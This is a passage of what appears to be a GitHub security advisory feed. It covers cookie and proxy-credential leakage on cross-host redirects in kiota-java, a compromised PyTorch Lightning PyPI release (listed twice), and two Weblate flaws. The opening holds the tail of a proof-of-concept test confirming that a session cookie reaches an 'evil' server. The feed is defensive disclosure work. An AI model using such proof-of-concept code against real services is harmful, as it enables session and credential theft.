assertEquals("session=SECRET", captured.getHeader("Cookie")); // LEAKED to evil server
evil.shutdown();
trusted.shutdown();
}
}
</code></pre>
<ol start="3">
<li><p>Run the tests:
./gradlew :components:http:okHttp:test --tests "com.microsoft.kiota.http.middleware.SecurityPoC"</p>
</li>
<li><p>Result: BUILD SUCCESSFUL, 2 tests passed, 0 failures.
Both tests confirm Cookie and Proxy-Authorization headers are sent to the attacker's server on cross-host redirect.</p>
</li>
</ol>
<h3 id="impact">Impact</h3>
<p>The kiota-java bug is more severe because it leaks ALL sensitive headers simultaneously (Cookie + Proxy-Authorization + custom auth headers), not just one type.</p>
<p>Attack scenario: An attacker who can trigger a cross-origin redirect from a trusted API (via open redirect, MITM, or DNS rebinding) captures the victim's session cookies, proxy credentials, and API keys from the redirected request.</p>
<p>Impact:</p>
<ul>
<li>Session hijacking via leaked Cookie headers</li>
<li>Corporate proxy credential theft via leaked Proxy-Authorization</li>
<li>API key theft via leaked custom auth headers (X-API-Key, etc.)</li>
</ul>
<p>All consumers of kiota-java are affected, including Microsoft Graph SDK for Java.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota-java/security/advisories/GHSA-7j59-v9qr-6fq9">https://github.com/microsoft/kiota-java/security/advisories/GHSA-7j59-v9qr-6fq9</a></li>
<li><a href="https://github.com/advisories/GHSA-7j59-v9qr-6fq9">https://github.com/advisories/GHSA-7j59-v9qr-6fq9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7j59-v9qr-6fq9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T01:49:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pytorch-lightning] Compromise of PyTorch Lightning PyPi Package Versions]]></title>
        <id>https://github.com/advisories/GHSA-w37p-236h-pfx3</id>
        <link href="https://github.com/advisories/GHSA-w37p-236h-pfx3"/>
        <updated>2026-05-07T00:52:56.000Z</updated>
        <content type="html"><![CDATA[<h1 id="security-advisory-compromise-of-pytorch-lightning-pypi-package-versions">Security Advisory: Compromise of PyTorch Lightning PyPI Package Versions</h1>
<p><strong>Published:</strong> 2026-04-30<br><strong>Last Updated:</strong> 2026-04-30  </p>
<p>Lightning AI has identified a security incident affecting certain versions of a PyPI package.</p>
<h2 id="what-happened">What happened</h2>
<p>Lightning AI has determined that one or more released versions of this package have been compromised and include malicious code.</p>
<p>The current investigation indicates that the affected versions have introduced functionality consistent with a credential harvesting mechanism. There is a continuing analysis the scope and behaviour of the code.</p>
<p>At this stage, the root cause of the compromise is still under investigation.</p>
<h2 id="what-versions-are-affected">What versions are affected</h2>
<p>Lightning AI is currently working to confirm the exact set of impacted versions.</p>
<p>The following versions are determined as affected, and developers should delete them from their systems:</p>
<ul>
<li><code>2.6.2</code></li>
<li><code>2.6.3</code></li>
</ul>
<p>Lightning AI will update this advisory if the versions impacted by this vulnerability change.</p>
<h2 id="what-you-should-do-immediately">What you should do immediately</h2>
<p>If developers have installed or are running any potentially affected versions on their application:</p>
<ul>
<li>Assume the environment may be compromised  </li>
<li>Immediately rotate all credentials and secrets that may have been exposed, including:  <ul>
<li>API keys  </li>
<li>Access tokens  </li>
<li>SSH keys  </li>
<li>Service account credentials</li>
</ul>
</li>
<li>Rebuild affected systems from a known clean state  </li>
<li>Pin PyTorch Lightning to version <code>2.6.1</code>  </li>
<li>Review logs for any suspicious or unauthorised activity</li>
</ul>
<h2 id="actions-lightning-ai-has-taken">Actions Lightning AI has taken</h2>
<ul>
<li>Quarantined malicious versions from PyPI  </li>
<li>Recommended using version <code>2.6.1</code>: <a href="https://github.com/Lightning-AI/pytorch-lightning/releases/tag/2.6.1">https://github.com/Lightning-AI/pytorch-lightning/releases/tag/2.6.1</a>  </li>
<li>Revoked and rotated all internal credentials associated with our release process  </li>
<li>Initiated a full investigation into the compromise</li>
</ul>
<h2 id="ongoing-investigation">Ongoing investigation</h2>
<p>Lightning AI is actively working to:</p>
<ul>
<li>Identify the exact mechanism of compromise  </li>
<li>Confirm the full set of affected versions  </li>
<li>Determine the behaviour and impact of the malicious code  </li>
<li>Assess any downstream impact to users</li>
</ul>
<p>Lightning AI will provide updates as soon as more information becomes available.</p>
<h2 id="commitment-to-transparency">Commitment to transparency</h2>
<p>Lightning AI takes the security of users and the integrity of the software supply chain extremely seriously.</p>
<p>Lightning AI will continue to share timely and accurate updates as the investigation progresses.</p>
<h2 id="contact">Contact</h2>
<p>If there are any questions or if there are concerns that a consuming project may be impacted, please send an email to:</p>
<p><strong><a href="mailto:security@lightning.ai">security@lightning.ai</a></strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Lightning-AI/pytorch-lightning/security/advisories/GHSA-w37p-236h-pfx3">https://github.com/Lightning-AI/pytorch-lightning/security/advisories/GHSA-w37p-236h-pfx3</a></li>
<li><a href="https://github.com/advisories/GHSA-w37p-236h-pfx3">https://github.com/advisories/GHSA-w37p-236h-pfx3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w37p-236h-pfx3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-07T00:52:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pytorch-lightning] Compromise of PyTorch Lightning PyPi Package Versions]]></title>
        <id>https://github.com/advisories/GHSA-w37p-236h-pfx3</id>
        <link href="https://github.com/advisories/GHSA-w37p-236h-pfx3"/>
        <updated>2026-05-07T00:52:56.000Z</updated>
        <content type="html"><![CDATA[<h1 id="security-advisory-compromise-of-pytorch-lightning-pypi-package-versions">Security Advisory: Compromise of PyTorch Lightning PyPI Package Versions</h1>
<p><strong>Published:</strong> 2026-04-30<br><strong>Last Updated:</strong> 2026-04-30  </p>
<p>Lightning AI has identified a security incident affecting certain versions of a PyPI package.</p>
<h2 id="what-happened">What happened</h2>
<p>Lightning AI has determined that one or more released versions of this package have been compromised and include malicious code.</p>
<p>The current investigation indicates that the affected versions have introduced functionality consistent with a credential harvesting mechanism. There is a continuing analysis the scope and behaviour of the code.</p>
<p>At this stage, the root cause of the compromise is still under investigation.</p>
<h2 id="what-versions-are-affected">What versions are affected</h2>
<p>Lightning AI is currently working to confirm the exact set of impacted versions.</p>
<p>The following versions are determined as affected, and developers should delete them from their systems:</p>
<ul>
<li><code>2.6.2</code></li>
<li><code>2.6.3</code></li>
</ul>
<p>Lightning AI will update this advisory if the versions impacted by this vulnerability change.</p>
<h2 id="what-you-should-do-immediately">What you should do immediately</h2>
<p>If developers have installed or are running any potentially affected versions on their application:</p>
<ul>
<li>Assume the environment may be compromised  </li>
<li>Immediately rotate all credentials and secrets that may have been exposed, including:  <ul>
<li>API keys  </li>
<li>Access tokens  </li>
<li>SSH keys  </li>
<li>Service account credentials</li>
</ul>
</li>
<li>Rebuild affected systems from a known clean state  </li>
<li>Pin PyTorch Lightning to version <code>2.6.1</code>  </li>
<li>Review logs for any suspicious or unauthorised activity</li>
</ul>
<h2 id="actions-lightning-ai-has-taken">Actions Lightning AI has taken</h2>
<ul>
<li>Quarantined malicious versions from PyPI  </li>
<li>Recommended using version <code>2.6.1</code>: <a href="https://github.com/Lightning-AI/pytorch-lightning/releases/tag/2.6.1">https://github.com/Lightning-AI/pytorch-lightning/releases/tag/2.6.1</a>  </li>
<li>Revoked and rotated all internal credentials associated with our release process  </li>
<li>Initiated a full investigation into the compromise</li>
</ul>
<h2 id="ongoing-investigation">Ongoing investigation</h2>
<p>Lightning AI is actively working to:</p>
<ul>
<li>Identify the exact mechanism of compromise  </li>
<li>Confirm the full set of affected versions  </li>
<li>Determine the behaviour and impact of the malicious code  </li>
<li>Assess any downstream impact to users</li>
</ul>
<p>Lightning AI will provide updates as soon as more information becomes available.</p>
<h2 id="commitment-to-transparency">Commitment to transparency</h2>
<p>Lightning AI takes the security of users and the integrity of the software supply chain extremely seriously.</p>
<p>Lightning AI will continue to share timely and accurate updates as the investigation progresses.</p>
<h2 id="contact">Contact</h2>
<p>If there are any questions or if there are concerns that a consuming project may be impacted, please send an email to:</p>
<p><strong><a href="mailto:security@lightning.ai">security@lightning.ai</a></strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Lightning-AI/pytorch-lightning/security/advisories/GHSA-w37p-236h-pfx3">https://github.com/Lightning-AI/pytorch-lightning/security/advisories/GHSA-w37p-236h-pfx3</a></li>
<li><a href="https://github.com/advisories/GHSA-w37p-236h-pfx3">https://github.com/advisories/GHSA-w37p-236h-pfx3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w37p-236h-pfx3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-07T00:52:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[weblate] Weblate vulnerable to XSS via crafted Markdown]]></title>
        <id>https://github.com/advisories/GHSA-5cmv-3rc4-7279</id>
        <link href="https://github.com/advisories/GHSA-5cmv-3rc4-7279"/>
        <updated>2026-05-07T00:04:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Markdown renderer used in user comments and other user-provided content didn't properly sanitize some attributes.</p>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/WeblateOrg/weblate/pull/19259">https://github.com/WeblateOrg/weblate/pull/19259</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Even though the attacker might be able to inject code into the HTML, the Weblate's strict CSP should mitigate the risks.</p>
<h3 id="acknowlegement">Acknowlegement</h3>
<p>Michal Čihař has identified and fixed this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/WeblateOrg/weblate/security/advisories/GHSA-5cmv-3rc4-7279">https://github.com/WeblateOrg/weblate/security/advisories/GHSA-5cmv-3rc4-7279</a></li>
<li><a href="https://github.com/WeblateOrg/weblate/pull/19259">https://github.com/WeblateOrg/weblate/pull/19259</a></li>
<li><a href="https://github.com/WeblateOrg/weblate/commit/85abc9df88b7464f4c0e794aef752e45f4230f75">https://github.com/WeblateOrg/weblate/commit/85abc9df88b7464f4c0e794aef752e45f4230f75</a></li>
<li><a href="https://github.com/advisories/GHSA-5cmv-3rc4-7279">https://github.com/advisories/GHSA-5cmv-3rc4-7279</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5cmv-3rc4-7279</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T00:04:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[weblate] Weblate Vulnerable to Private Translation Enumeration via Screenshot API]]></title>
        <id>https://github.com/advisories/GHSA-gcg5-86jr-f7jg</id>
        <link href="https://github.com/advisories/GHSA-gcg5-86jr-f7jg"/>
        <updated>2026-05-07T00:03:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The screenshots, tasks, and component link API allowed for the enumeration of translations in a project inaccessible to the user.</p>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/WeblateOrg/weblate/pull/19258">https://github.com/WeblateOrg/weblate/pull/19258</a></li>
</ul>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>Weblate thanks Luay for reporting this vulnerability according to the organization's <a href="https://docs.weblate.org/en/latest/security/issues.html">security issues guideline</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/WeblateOrg/weblate/security/advisories/GHSA-gcg5-86jr-f7jg">https://github.com/WeblateOrg/weblate/security/advisories/GHSA-gcg5-86jr-f7jg</a></li>
<li><a href="https://github.com/WeblateOrg/weblate/pull/19258">https://github.com/WeblateOrg/weblate/pull/19258</a></li>
<li><a href="https://github.com/WeblateOrg/weblate/commit/6cf892c7bd50b667a65a99d716a90694f7d9f203">https://github.com/WeblateOrg/weblate/commit/6cf892c7bd50b667a65a99d716a90694f7d9f203</a></li>
<li><a href="https://github.com/advisories/GHSA-gcg5-86jr-f7jg">https://github.com/advisories/GHSA-gcg5-86jr-f7jg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gcg5-86jr-f7jg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T00:03:50.000Z</published>
    </entry>
</feed>